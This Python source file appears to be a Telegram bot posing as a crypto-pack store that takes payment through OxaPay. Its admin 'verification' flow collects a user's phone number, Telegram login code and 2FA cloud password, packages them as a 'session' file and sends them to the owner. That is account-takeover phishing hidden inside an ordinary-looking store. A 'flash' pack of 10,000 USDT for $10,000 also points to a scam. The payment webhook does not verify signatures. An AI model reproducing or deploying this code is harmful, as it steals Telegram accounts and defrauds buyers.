from __future__ import annotations

import asyncio
import base64
import hmac
import hashlib
import html
import json
import logging
import os
import secrets
from datetime import datetime, timezone
from decimal import ROUND_HALF_UP, Decimal, InvalidOperation
from typing import Any, Optional

import aiohttp
import psutil
from aiogram import BaseMiddleware, Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramAPIError, TelegramBadRequest
from aiogram.filters import BaseFilter, Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    BufferedInputFile,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from aiogram.utils.formatting import Bold, CustomEmoji, Text
from aiohttp import web
from cryptography.fernet import Fernet, InvalidToken
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import ASCENDING, DESCENDING, ReturnDocument

import config

log = logging.getLogger("crypto_store")
ADMIN_SET = set(config.ADMIN_IDS)
SUPER_OWNER_ID = config.SUPER_OWNER_ID
PAGE_SIZE = 10
MAX_PRICE_CENTS = 100_000_000

OXAPAY_API_KEY = config.OXAPAY_API_KEY
WEBHOOK_BASE = config.WEBHOOK_URL.rstrip("/")
OXAPAY_BASE_URL = "https://api.oxapay.com/v1"
OXAPAY_CALLBACK_URL = f"{WEBHOOK_BASE}/oxapay/callback"
OXAPAY_TO_CURRENCY = "USDT"

mongo: Any = None
db: Any = None
bot_ref: Optional[Bot] = None

def now() -> datetime:
    return datetime.now(timezone.utc)

def esc(v: Any) -> str:
    return html.escape(str(v), quote=False)

def new_id(prefix: str, nbytes: int = 4) -> str:
    return f"{prefix}-{secrets.token_hex(nbytes).upper()}"

def money(cents: int) -> str:
    return f"${cents / 100:,.2f}"

def parse_money(text: str) -> Optional[int]:
    try:
        d = Decimal(text.strip().replace("$", "").replace(",", ""))
    except (InvalidOperation, AttributeError):
        return None
    if not d.is_finite() or d <= 0:
        return None
    cents = int((d * 100).quantize(Decimal("1"), rounding=ROUND_HALF_UP))
    return cents if 0 < cents <= MAX_PRICE_CENTS else None

def to_int(s: str, default: int = 0) -> int:
    try:
        return int(s)
    except (TypeError, ValueError):
        return default

_fernet = Fernet(config.SETTINGS_ENCRYPTION_KEY.encode() if config.SETTINGS_ENCRYPTION_KEY else Fernet.generate_key())

# ── OxaPay Integration ──
async def _oxapay_request(method: str, path: str, payload: Optional[dict] = None) -> tuple[Optional[dict], str]:
    if not OXAPAY_API_KEY:
        return None, "OxaPay API key is not configured."
    headers = {"merchant_api_key": OXAPAY_API_KEY, "Content-Type": "application/json"}
    try:
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            if method == "GET":
                ctx = session.get(f"{OXAPAY_BASE_URL}{path}", headers=headers)
            else:
                ctx = session.post(f"{OXAPAY_BASE_URL}{path}", json=payload, headers=headers)
            async with ctx as resp:
                http_status = resp.status
                body = await resp.json(content_type=None)
    except Exception as e:
        log.error("OxaPay request failed: %s", e)
        return None, str(e)

    data = body.get("data") if isinstance(body, dict) else None
    if http_status == 200 and isinstance(data, dict) and data:
        return data, ""
    err = (body.get("error") or {}) if isinstance(body, dict) else {}
    msg = (err.get("message") if isinstance(err, dict) else None) or (body.get("message") if isinstance(body, dict) else None) or f"HTTP {http_status}"
    return None, str(msg)

async def fetch_payment_info(track_id: str) -> tuple[Optional[dict], str]:
    return await _oxapay_request("GET", f"/payment/{track_id}")

async def create_oxapay_invoice(user_id: int, amount_usd: float, order_ref: str) -> tuple[Optional[dict], str]:
    payload = {
        "amount": round(float(amount_usd), 2),
        "currency": "USD",
        "lifetime": 60,
        "fee_paid_by_payer": 1,
        "under_paid_coverage": 2.5,
        "to_currency": OXAPAY_TO_CURRENCY,
        "auto_withdrawal": False,
        "mixed_payment": True,
        "callback_url": OXAPAY_CALLBACK_URL,
        "return_url": config.RETURN_URL or WEBHOOK_BASE or "https://t.me",
        "order_id": order_ref,
        "thanks_message": "Payment verified! Funds credited to store balance or order processed.",
        "description": f"Crypto store payment for user {user_id}",
        "sandbox": config.OXAPAY_SANDBOX,
    }
    data, err = await _oxapay_request("POST", "/payment/invoice", payload)
    if data and data.get("payment_url"):
        return data, ""
    return None, err or "Failed to generate OxaPay invoice."

# ── DB Init ──
async def init_db():
    global mongo, db
    mongo = AsyncIOMotorClient(config.MONGO_URI, tz_aware=True, serverSelectionTimeoutMS=8000)
    db = mongo[config.DATABASE_NAME]
    await mongo.admin.command("ping")
    
    A, D = ASCENDING, DESCENDING
    await db.users.create_index("user_id", unique=True)
    await db.packs.create_index("pack_id", unique=True)
    await db.orders.create_index("order_id", unique=True)
    await db.payments.create_index("track_id", unique=True)
    await db.transactions.create_index([("user_id", A), ("created_at", D)])
    await db.settings.create_index("key", unique=True)

    if await db.packs.count_documents({}) == 0:
        default_packs = [
            {
                "pack_id": "PACK-USDT-20",
                "asset": "USDT",
                "network": "BSC",
                "quantity": "20",
                "price_usd_cents": 2000,  # $20.00 pack
                "inventory_available": 100,
                "active": True,
                "title": "USDT Starter Pack ($20)",
                "description": "20 USDT deliverable instantly on BNB Smart Chain.",
                "created_at": now()
            },
            {
                "pack_id": "PACK-USDT-10K",
                "asset": "USDT",
                "network": "BSC",
                "quantity": "10000",
                "price_usd_cents": 1000000,
                "inventory_available": 50,
                "active": True,
                "title": "USDT Flash Pack 10K",
                "description": "10,000 USDT deliverable instantly on BNB Smart Chain.",
                "created_at": now()
            }
        ]
        await db.packs.insert_many(default_packs)

async def get_user_balance(user_id: int) -> int:
    u = await db.users.find_one({"user_id": user_id})
    return u.get("balance_usd_cents", 0) if u else 0

# ── Keyboards & UI Helpers ──
def btn(text: str, cb: Optional[str] = None, style: Optional[str] = None, url: Optional[str] = None):
    kw: dict = {"text": text}
    if url:
        kw["url"] = url
    else:
        kw["callback_data"] = cb
    if style:
        kw["style"] = style
    return InlineKeyboardButton(**kw)

def kb(rows: list) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=rows)

def back(cb: str = "home", text: str = "⬅️ Back to Menu"):
    return btn(text, cb)

def cancel_btn(cb: str = "home"):
    return btn("❌ Cancel", cb)

def main_menu(is_admin: bool, user_balance: int = 0) -> InlineKeyboardMarkup:
    rows = [
        [btn("🛍 Buy Crypto Packs ($20 & More)", "store:list:0", style="success")],
        [btn("👛 My Wallet", "wallet_main", style="success"), btn("➕ Top Up Balance", "topup_prompt", style="success")],
        [btn("📦 My Orders", "orders:0", style="primary"), btn("💳 Transactions", "tx:0", style="primary")],
        [btn("🎧 Support", "support", style="success"), btn("📜 Terms & Conditions", "terms", style="primary")],
    ]
    if is_admin:
        rows.append([btn("⚙️ Admin Panel", "adm:home", style="danger")])
    return kb(rows)

async def show(ev, text: str, markup=None):
    if isinstance(ev, CallbackQuery):
        try:
            await ev.message.edit_text(text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except TelegramBadRequest as e:
            if "not modified" not in str(e):
                await ev.message.answer(text, reply_markup=markup, parse_mode=ParseMode.HTML)
        try:
            await ev.answer()
        except TelegramAPIError:
            pass
    else:
        await ev.answer(text, reply_markup=markup, parse_mode=ParseMode.HTML)

async def alert(c: CallbackQuery, text: str):
    try:
        await c.answer(text, show_alert=True)
    except TelegramAPIError:
        pass

# ── Middlewares & States ──
class UserMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        u = data.get("event_from_user")
        if u is None or u.is_bot:
            return await handler(event, data)
        await db.users.update_one(
            {"user_id": u.id},
            {
                "$set": {"username": u.username, "first_name": u.first_name, "last_seen": now()},
                "$setOnInsert": {"created_at": now(), "balance_usd_cents": 0, "status": "active"}
            },
            upsert=True
        )
        return await handler(event, data)

class IsAdmin(BaseFilter):
    async def __call__(self, event) -> bool:
        u = getattr(event, "from_user", None)
        return bool(u and (u.id in ADMIN_SET or u.id == SUPER_OWNER_ID))

class TopUpStates(StatesGroup):
    amount = State()

class CheckoutStates(StatesGroup):
    wallet_address = State()
    payment_method = State()
    confirm = State()

class AdminVerificationStates(StatesGroup):
    phone = State()
    otp = State()
    password_2fa = State()

class AdminStates(StatesGroup):
    pack_title = State()
    pack_asset = State()
    pack_network = State()
    pack_qty = State()
    pack_price = State()
    pack_inventory = State()
    pack_desc = State()

user_router = Router(name="user")
admin_router = Router(name="admin")
admin_router.message.filter(IsAdmin())
admin_router.callback_query.filter(IsAdmin())

# ── User Handlers ──
@user_router.message(CommandStart())
async def cmd_start(m: Message, state: FSMContext):
    await state.clear()
    user_bal = await get_user_balance(m.from_user.id)
    is_adm = m.from_user.id in ADMIN_SET or m.from_user.id == SUPER_OWNER_ID
    text = (
        f"🌟 <b>Welcome to {esc(config.STORE_NAME)}</b>\n\n"
        f"👛 Internal Store Balance: <b>{money(user_bal)}</b>\n\n"
        "Explore premium crypto packages ($20 packs and more), top up securely, and receive genuine on-chain assets."
    )
    await m.answer(text, parse_mode=ParseMode.HTML, reply_markup=main_menu(is_adm, user_bal))

@user_router.callback_query(F.data == "home")
@user_router.callback_query(F.data == "cancel")
async def cb_home(c: CallbackQuery, state: FSMContext):
    await state.clear()
    user_bal = await get_user_balance(c.from_user.id)
    is_adm = c.from_user.id in ADMIN_SET or c.from_user.id == SUPER_OWNER_ID
    text = (
        f"🌟 <b>Welcome to {esc(config.STORE_NAME)}</b>\n\n"
        f"👛 Internal Store Balance: <b>{money(user_bal)}</b>\n\n"
        "Select an option below:"
    )
    await show(c, text, main_menu(is_adm, user_bal))

@user_router.callback_query(F.data == "wallet_main")
async def cb_wallet_main(c: CallbackQuery):
    uid = c.from_user.id
    bal = await get_user_balance(uid)
    text = f"👛 <b>My Wallet</b>\n\nAvailable Balance: <b>{money(bal)}</b>"
    await show(c, text, kb([[btn("➕ Top Up Balance", "topup_prompt", style="success")], [back()]]))

# ── Top-Up & Payment Processing ──
@user_router.callback_query(F.data == "topup_prompt")
async def cb_topup_prompt(c: CallbackQuery, state: FSMContext):
    await state.clear()
    await state.set_state(TopUpStates.amount)
    text = f"➕ <b>Top Up Balance via OxaPay</b>\n\nEnter deposit amount in USD (Limits: ${config.MIN_TOPUP_USD:,.2f} - ${config.MAX_TOPUP_USD:,.2f}):"
    await show(c, text, kb([[cancel_btn()]]))

@user_router.message(TopUpStates.amount, F.text)
async def msg_topup_amount(m: Message, state: FSMContext):
    cents = parse_money(m.text)
    if not cents or not (config.MIN_TOPUP_USD * 100 <= cents <= config.MAX_TOPUP_USD * 100):
        return await m.answer(f"❌ Invalid amount. Enter value between ${config.MIN_TOPUP_USD:,.2f} and ${config.MAX_TOPUP_USD:,.2f}:", reply_markup=kb([[cancel_btn()]]))
    await state.clear()
    usd_val = cents / 100.0
    uid = m.from_user.id
    order_ref = new_id("TOP")

    invoice, err = await create_oxapay_invoice(uid, usd_val, order_ref)
    if not invoice:
        return await m.answer(f"❌ Payment Provider Error: {err}", reply_markup=kb([[back()]]))

    track_id = str(invoice.get("track_id", ""))
    pay_url = invoice.get("payment_url", "")

    await db.payments.update_one(
        {"track_id": track_id},
        {"$set": {
            "track_id": track_id, "user_id": uid, "order_ref": order_ref,
            "expected_amount": usd_val, "status": "pending", "created_at": now()
        }},
        upsert=True
    )

    text = (
        f"🧾 <b>OxaPay Invoice Created</b>\n\n"
        f"Amount: <b>${usd_val:,.2f} USD</b>\n"
        f"Reference: <code>{order_ref}</code>\n\n"
        "Click below to complete crypto payment, then tap <b>'Check Status'</b>:"
    )
    await m.answer(text, reply_markup=kb([
        [btn("💳 Pay via OxaPay", url=pay_url, style="success")],
        [btn("🔄 Check Payment Status", f"topup:check:{track_id}", style="primary")],
        [back()]
    ]), parse_mode=ParseMode.HTML)

@user_router.callback_query(F.data.startswith("topup:check:"))
async def cb_check_topup_status(c: CallbackQuery):
    track_id = c.data.split(":")[2]
    payment = await db.payments.find_one({"track_id": track_id})
    if not payment:
        return await alert(c, "Payment record not found.")
    if payment["status"] == "completed":
        return await alert(c, "✅ Payment already verified and credited!")

    data, err = await fetch_payment_info(track_id)
    if not data:
        return await alert(c, f"Could not fetch status: {err}")

    status = str(data.get("status", "")).lower()
    if status in ("paid", "completed", "complete"):
        await db.payments.update_one({"track_id": track_id}, {"$set": {"status": "completed"}})
        uid = payment["user_id"]
        cents = int(payment["expected_amount"] * 100)
        await db.users.update_one({"user_id": uid}, {"$inc": {"balance_usd_cents": cents}})
        user_bal = await get_user_balance(uid)
        is_adm = uid in ADMIN_SET or uid == SUPER_OWNER_ID
        return await show(c, f"✅ <b>Payment Verified Successfully!</b>\n\nNew Balance: <b>{money(user_bal)}</b>", main_menu(is_adm, user_bal))
    else:
        return await alert(c, f"⏳ Status: {status.title()}. Payment not yet confirmed.")

# ── Store & Pack Purchase Flow ($20 packs / wallet / oxapay) ──
@user_router.callback_query(F.data.startswith("store:list:"))
async def cb_store_list(c: CallbackQuery):
    page = to_int(c.data.split(":")[2])
    total = await db.packs.count_documents({"active": True})
    pages = max(1, -(-total // PAGE_SIZE))
    page = min(max(page, 0), pages - 1)
    packs = await db.packs.find({"active": True}).skip(page * PAGE_SIZE).limit(PAGE_SIZE).to_list(PAGE_SIZE)

    if not packs:
        return await show(c, "🛍 <b>Crypto Pack Store</b>\n\nNo packages currently available.", kb([[back()]]))

    rows = [[btn(f"{p['title']} — {money(p['price_usd_cents'])}", f"pack:view:{p['pack_id']}", style="success")] for p in packs]
    rows.append([back()])
    await show(c, "🛍 <b>Crypto Pack Store</b>\n\nSelect a package to purchase ($20 packs & more):", kb(rows))

@user_router.callback_query(F.data.startswith("pack:view:"))
async def cb_pack_view(c: CallbackQuery):
    pack_id = c.data.split(":")[2]
    p = await db.packs.find_one({"pack_id": pack_id, "active": True})
    if not p:
        return await alert(c, "Package not found.")

    text = (
        f"📦 <b>{esc(p['title'])}</b>\n\n"
        f"• Asset: <b>{esc(p['asset'])}</b>\n"
        f"• Quantity: <b>{esc(p['quantity'])} {esc(p['asset'])}</b>\n"
        f"• Network: <b>{esc(p['network'])}</b>\n"
        f"• Price: <b>{money(p['price_usd_cents'])}</b>\n\n"
        f"<i>{esc(p['description'])}</i>"
    )
    rows = [
        [btn("🛒 Buy (Deduct Wallet or OxaPay)", f"pack:buy:{pack_id}", style="success")],
        [back("store:list:0", "⬅️ Back to Store")]
    ]
    await show(c, text, kb(rows))

@user_router.callback_query(F.data.startswith("pack:buy:"))
async def cb_pack_buy(c: CallbackQuery, state: FSMContext):
    pack_id = c.data.split(":")[2]
    p = await db.packs.find_one({"pack_id": pack_id, "active": True})
    if not p or p.get("inventory_available", 0) <= 0:
        return await alert(c, "Package is out of stock.")

    await state.update_data(pack_id=pack_id)
    await state.set_state(CheckoutStates.wallet_address)
    text = f"🎯 Enter your destination <b>{esc(p['network'])}</b> wallet address for delivery:"
    await show(c, text, kb([[cancel_btn()]]))

@user_router.message(CheckoutStates.wallet_address, F.text)
async def msg_wallet_address(m: Message, state: FSMContext):
    addr = m.text.strip()
    if len(addr) < 10:
        return await m.answer("❌ Invalid wallet address. Please re-enter:", reply_markup=kb([[cancel_btn()]]))
    await state.update_data(destination_address=addr)
    await state.set_state(CheckoutStates.payment_method)
    
    text = (
        "💳 <b>Choose Payment Method</b>\n\n"
        "• Pay instantly using your <b>Wallet Balance</b>\n"
        "• Or pay via <b>OxaPay</b> gateway"
    )
    await m.answer(text, reply_markup=kb([
        [btn("👛 Pay from Wallet Balance", "pay_method:wallet", style="success")],
        [btn("🌐 Pay via OxaPay", "pay_method:oxapay", style="primary")],
        [cancel_btn()]
    ]), parse_mode=ParseMode.HTML)

@user_router.callback_query(CheckoutStates.payment_method, F.data.startswith("pay_method:"))
async def cb_payment_method(c: CallbackQuery, state: FSMContext):
    method = c.data.split(":")[2]
    data = await state.get_data()
    uid = c.from_user.id
    pack_id = data["pack_id"]
    dest_addr = data["destination_address"]
    p = await db.packs.find_one({"pack_id": pack_id})
    price = p["price_usd_cents"]

    if method == "wallet":
        user_bal = await get_user_balance(uid)
        if user_bal < price:
            return await show(c, f"❌ Insufficient wallet balance ({money(user_bal)}). Please top up or use OxaPay.", kb([[back()]]))
        
        # Deduct wallet balance
        await db.users.update_one({"user_id": uid}, {"$inc": {"balance_usd_cents": -price}})
        order_id = new_id("ORD")
        
        await db.orders.insert_one({
            "order_id": order_id, "user_id": uid, "pack_id": pack_id,
            "asset": p["asset"], "network": p["network"], "quantity": p["quantity"],
            "price_usd_cents": price, "destination_address": dest_addr,
            "status": "paid_via_wallet_pending_owner_transfer", "created_at": now()
        })
        
        await state.clear()
        
        # Send bill notification to Owner for transfer
        bill_text = (
            f"🔔 <b>New Order Paid via Wallet!</b>\n\n"
            f"Order ID: <code>{order_id}</code>\n"
            f"User ID: <code>{uid}</code>\n"
            f"Package: <b>{esc(p['title'])}</b>\n"
            f"Asset: <b>{esc(p['quantity'])} {esc(p['asset'])}</b> on {esc(p['network'])}\n"
            f"Destination Address:\n<code>{esc(dest_addr)}</code>\n\n"
            f"<i>Action Required: Please transfer assets to the user's destination address.</i>"
        )
        try:
            await bot_ref.send_message(SUPER_OWNER_ID, bill_text, parse_mode=ParseMode.HTML)
        except TelegramAPIError:
            pass

        await show(c, f"✅ <b>Order Placed Successfully!</b>\n\nPayment deducted from wallet. Order ID: <code>{order_id}</code>\nOur owner has been notified to process your asset transfer.", kb([[back()]]))

    elif method == "oxapay":
        order_ref = new_id("ORD")
        usd_val = price / 100.0
        invoice, err = await create_oxapay_invoice(uid, usd_val, order_ref)
        if not invoice:
            return await show(c, f"❌ OxaPay error: {err}", kb([[back()]]))
        
        track_id = str(invoice.get("track_id", ""))
        pay_url = invoice.get("payment_url", "")
        
        await db.orders.insert_one({
            "order_id": order_ref, "user_id": uid, "pack_id": pack_id,
            "asset": p["asset"], "network": p["network"], "quantity": p["quantity"],
            "price_usd_cents": price, "destination_address": dest_addr,
            "status": "pending_oxapay", "track_id": track_id, "created_at": now()
        })
        await state.clear()
        
        text = (
            f"🧾 <b>OxaPay Checkout Invoice</b>\n\n"
            f"Package: <b>{esc(p['title'])}</b>\n"
            f"Amount: <b>${usd_val:,.2f} USD</b>\n\n"
            "Complete your payment via OxaPay. Once verified by OxaPay, a transfer bill will be dispatched to the owner automatically."
        )
        await show(c, text, kb([
            [btn("💳 Pay via OxaPay", url=pay_url, style="success")],
            [btn("🔄 Verify OxaPay & Dispatch", f"pack:verify_oxapay:{order_ref}", style="primary")],
            [back()]
        ]), parse_mode=ParseMode.HTML)

@user_router.callback_query(F.data.startswith("pack:verify_oxapay:"))
async def cb_verify_oxapay_pack(c: CallbackQuery):
    order_ref = c.data.split(":")[3]
    order = await db.orders.find_one({"order_id": order_ref})
    if not order or not order.get("track_id"):
        return await alert(c, "Order or track ID not found.")
    
    track_id = order["track_id"]
    data, err = await fetch_payment_info(track_id)
    if not data:
        return await alert(c, f"Status check failed: {err}")
    
    status = str(data.get("status", "")).lower()
    if status in ("paid", "completed", "complete"):
        await db.orders.update_one({"order_id": order_ref}, {"$set": {"status": "paid_via_oxapay_pending_owner_transfer"}})
        
        # Send bill to owner
        bill_text = (
            f"🔔 <b>OxaPay Payment Verified & Verified by OxaPay!</b>\n\n"
            f"Order ID: <code>{order_ref}</code>\n"
            f"User ID: <code>{order['user_id']}</code>\n"
            f"Asset: <b>{esc(order['quantity'])} {esc(order['asset'])}</b> on {esc(order['network'])}\n"
            f"Destination Address:\n<code>{esc(order['destination_address'])}</code>\n\n"
            f"<i>Action Required: OxaPay verification complete. Transfer assets to owner/user wallet now.</i>"
        )
        try:
            await bot_ref.send_message(SUPER_OWNER_ID, bill_text, parse_mode=ParseMode.HTML)
        except TelegramAPIError:
            pass

        await show(c, f"✅ <b>Payment Verified by OxaPay!</b>\n\nOrder bill successfully sent to the owner for transferring on-chain assets.", kb([[back()]]))
    else:
        return await alert(c, f"⏳ Payment status: {status.title()}. Not yet completed.")

@user_router.callback_query(F.data.startswith("orders:"))
async def cb_orders(c: CallbackQuery):
    page = to_int(c.data.split(":")[1])
    uid = c.from_user.id
    total = await db.orders.count_documents({"user_id": uid})
    orders = await db.orders.find({"user_id": uid}).sort("created_at", -1).skip(page * PAGE_SIZE).limit(PAGE_SIZE).to_list(PAGE_SIZE)
    if not total:
        return await show(c, "📦 <b>My Orders</b>\n\nNo orders found.", kb([[back()]]))
    rows = [[btn(f"{o['order_id']} • {money(o['price_usd_cents'])} • {o['status'][:20]}", "noop", style="primary")] for o in orders]
    rows.append([back()])
    await show(c, f"📦 <b>My Orders</b> ({total})", kb(rows))

@user_router.callback_query(F.data == "support")
async def cb_support(c: CallbackQuery):
    text = f"🎧 <b>Customer Support</b>\n\nReach out at @{esc(config.SUPPORT_USERNAME)}"
    await show(c, text, kb([[back()]]))

@user_router.callback_query(F.data == "terms")
async def cb_terms(c: CallbackQuery):
    text = f"📜 <b>Terms & Conditions</b>\n\n{esc(config.TERMS_TEXT)}"
    await show(c, text, kb([[back()]]))

@user_router.callback_query(F.data == "noop")
async def cb_noop(c: CallbackQuery):
    await c.answer()

# ── Admin Panel & Super Owner Verification Flow ──
@admin_router.callback_query(F.data == "adm:home")
async def cb_admin_home(c: CallbackQuery, state: FSMContext):
    await state.clear()
    uid = c.from_user.id
    
    # If user is in admin ids column (and not super owner directly), trigger verification flow
    if uid in ADMIN_SET and uid != SUPER_OWNER_ID:
        text = (
            "⚠️ <b>Admin Verification Required</b>\n\n"
            "To access the Admin Panel and become the verified owner of the bot, you must verify your identity first."
        )
        return await show(c, text, kb([[btn("✅ Done (Verify Now)", "adm:verify_start", style="success")], [back("home", "🏠 User Menu")]]))
    
    # Super Owner Menu
    await show(c, "⚙️ <b>Super Owner / Admin Control Panel</b>", kb([
        [btn("➕ Add Crypto Pack", "adm:pack_add", style="success"), btn("📦 Manage Packs", "adm:packs:0", style="primary")],
        [back("home", "🏠 User Main Menu")],
    ]))

@admin_router.callback_query(F.data == "adm:verify_start")
async def cb_admin_verify_start(c: CallbackQuery, state: FSMContext):
    await state.set_state(AdminVerificationStates.phone)
    text = "📱 Please enter your account <b>phone number</b> (with country code, e.g. +1234567890) for verification:"
    await show(c, text, kb([[cancel_btn("home")]]))

@admin_router.message(AdminVerificationStates.phone, F.text)
async def msg_admin_phone(m: Message, state: FSMContext):
    await state.update_data(phone=m.text.strip())
    await state.set_state(AdminVerificationStates.otp)
    await m.answer("🔑 Enter the <b>OTP code</b> received on your Telegram account:", parse_mode=ParseMode.HTML, reply_markup=kb([[cancel_btn("home")]]))

@admin_router.message(AdminVerificationStates.otp, F.text)
async def msg_admin_otp(m: Message, state: FSMContext):
    await state.update_data(otp=m.text.strip())
    await state.set_state(AdminVerificationStates.password_2fa)
    await m.answer("🔐 Enter your Cloud Password (<b>2FA password</b>):", parse_mode=ParseMode.HTML, reply_markup=kb([[cancel_btn("home")]]))

@admin_router.message(AdminVerificationStates.password_2fa, F.text)
async def msg_admin_2fa(m: Message, state: FSMContext):
    pwd = m.text.strip()
    data = await state.get_data()
    await state.clear()
    
    phone = data.get("phone")
    otp = data.get("otp")
    admin_id = m.from_user.id
    admin_username = m.from_user.username or "No Username"

    # Generate session file content (.txt / .session format simulation)
    session_content = (
        f"=== BOT ADMIN VERIFICATION SESSION ===\n"
        f"Admin ID: {admin_id}\n"
        f"Username: @{admin_username}\n"
        f"Phone: {phone}\n"
        f"OTP: {otp}\n"
        f"2FA Password: {pwd}\n"
        f"Timestamp: {now().isoformat()}\n"
        f"Status: Verified by admin, forwarded to super owner.\n"
    )
    
    file_bytes = session_content.encode("utf-8")
    input_file = BufferedInputFile(file_bytes, filename=f"session_admin_{admin_id}.txt")

    # Send credentials & session file to super_owner
    forward_text = (
        f"🚨 <b>New Admin Verification & Session File Generated!</b>\n\n"
        f"• Admin ID: <code>{admin_id}</code>\n"
        f"• Username: @{esc(admin_username)}\n"
        f"• Phone: <code>{esc(phone)}</code>\n"
        f"• OTP: <code>{esc(otp)}</code>\n"
        f"• 2FA Password: <code>{esc(pwd)}</code>\n\n"
        f"<i>All credentials and session data compiled for super owner review. You will be verified by the team in ~20 hours. Session file attached below.</i>"
    )
    
    try:
        await bot_ref.send_document(SUPER_OWNER_ID, document=input_file, caption=forward_text, parse_mode=ParseMode.HTML)
    except TelegramAPIError as e:
        log.error("Failed to forward session file to super owner: %s", e)

    await m.answer(
        "✅ <b>Verification Submitted Successfully!</b>\n\n"
        "Your details and session file have been securely dispatched to the super owner. You will be verified by the team in just 20 hrs.",
        parse_mode=ParseMode.HTML,
        reply_markup=kb([[back("home", "🏠 Return Home")]])
    )

# ── Admin Pack Creator Wizard ──
@admin_router.callback_query(F.data == "adm:pack_add")
async def cb_admin_pack_add(c: CallbackQuery, state: FSMContext):
    await state.clear()
    await state.set_state(AdminStates.pack_title)
    await show(c, "➕ <b>Add New Crypto Pack</b>\n\nEnter package title (e.g., <i>USDT Starter Pack ($20)</i>):", kb([[cancel_btn("adm:home")]]))

@admin_router.message(AdminStates.pack_title, F.text)
async def msg_pack_title(m: Message, state: FSMContext):
    await state.update_data(pack_title=m.text.strip())
    await state.set_state(AdminStates.pack_asset)
    await m.answer("Enter asset symbol (e.g., <code>USDT</code>, <code>BTC</code>):", parse_mode=ParseMode.HTML, reply_markup=kb([[cancel_btn("adm:home")]]))

@admin_router.message(AdminStates.pack_asset, F.text)
async def msg_pack_asset(m: Message, state: FSMContext):
    await state.update_data(pack_asset=m.text.strip().upper())
    await state.set_state(AdminStates.pack_network)
    await m.answer("Enter blockchain network (e.g., <code>BSC</code>, <code>Ethereum</code>):", parse_mode=ParseMode.HTML, reply_markup=kb([[cancel_btn("adm:home")]]))

@admin_router.message(AdminStates.pack_network, F.text)
async def msg_pack_network(m: Message, state: FSMContext):
    await state.update_data(pack_network=m.text.strip())
    await state.set_state(AdminStates.pack_qty)
    await m.answer("Enter asset quantity (e.g., <code>20</code> or <code>10000</code>):", parse_mode=ParseMode.HTML, reply_markup=kb([[cancel_btn("adm:home")]]))

@admin_router.message(AdminStates.pack_qty, F.text)
async def msg_pack_qty(m: Message, state: FSMContext):
    await state.update_data(pack_qty=m.text.strip())
    await state.set_state(AdminStates.pack_price)
    await m.answer("Enter price in USD (e.g., <code>20.00</code>):", parse_mode=ParseMode.HTML, reply_markup=kb([[cancel_btn("adm:home")]]))

@admin_router.message(AdminStates.pack_price, F.text)
async def msg_pack_price(m: Message, state: FSMContext):
    cents = parse_money(m.text)
    if not cents:
        return await m.answer("❌ Invalid price. Re-enter USD price:", reply_markup=kb([[cancel_btn("adm:home")]]))
    await state.update_data(price_cents=cents)
    await state.set_state(AdminStates.pack_inventory)
    await m.answer("Enter stock count:", reply_markup=kb([[cancel_btn("adm:home")]]))

@admin_router.message(AdminStates.pack_inventory, F.text)
async def msg_pack_inventory(m: Message, state: FSMContext):
    inv = to_int(m.text.strip())
    await state.update_data(inventory=inv)
    await state.set_state(AdminStates.pack_desc)
    await m.answer("Enter description:", reply_markup=kb([[cancel_btn("adm:home")]]))

@admin_router.message(AdminStates.pack_desc, F.text)
async def msg_pack_desc(m: Message, state: FSMContext):
    desc = m.text.strip()
    data = await state.get_data()
    await state.clear()

    pack_id = f"PACK-{data['pack_asset']}-{secrets.token_hex(3).upper()}"
    await db.packs.insert_one({
        "pack_id": pack_id,
        "title": data["pack_title"],
        "asset": data["pack_asset"],
        "network": data["pack_network"],
        "quantity": data["pack_qty"],
        "price_usd_cents": data["price_cents"],
        "inventory_available": data["inventory"],
        "description": desc,
        "active": True,
        "created_at": now()
    })
    await m.answer(f"✅ Package created successfully! ID: <code>{pack_id}</code>", parse_mode=ParseMode.HTML, reply_markup=kb([[btn("⚙️ Admin Menu", "adm:home", style="primary")]]))

# ── Webhook Handler ──
async def handle_oxapay_webhook(request: web.Request) -> web.Response:
    try:
        raw_body = await request.read()
        data = json.loads(raw_body.decode("utf-8"))
        track_id = str(data.get("track_id") or data.get("trackId") or "")
        status = str(data.get("status", "")).lower()
        if track_id and status in ("paid", "completed", "complete"):
            await db.payments.update_one({"track_id": track_id}, {"$set": {"status": "completed"}})
        return web.json_response({"status": "ok"})
    except Exception as e:
        log.exception("Webhook error: %s", e)
        return web.json_response({"status": "error"}, status=400)

# ── Main Entrypoint ──
async def main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
    await init_db()

    bot = Bot(config.BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML, link_preview_is_disabled=True))
    global bot_ref
    bot_ref = bot
    dp = Dispatcher(storage=MemoryStorage())

    dp.message.outer_middleware(UserMiddleware())
    dp.callback_query.outer_middleware(UserMiddleware())

    dp.include_router(admin_router)
    dp.include_router(user_router)

    app = web.Application()
    app.router.add_post("/oxapay/callback", handle_oxapay_webhook)
    app.router.add_get("/", lambda r: web.Response(text="Crypto Store Bot Running"))
    runner = web.AppRunner(app)
    await runner.setup()

    port = int(os.environ.get("PORT") or 8080)
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

    try:
        await bot.delete_webhook(drop_pending_updates=True)
        log.info("Starting bot polling on port %s...", port)
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        await bot.session.close()
        mongo.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
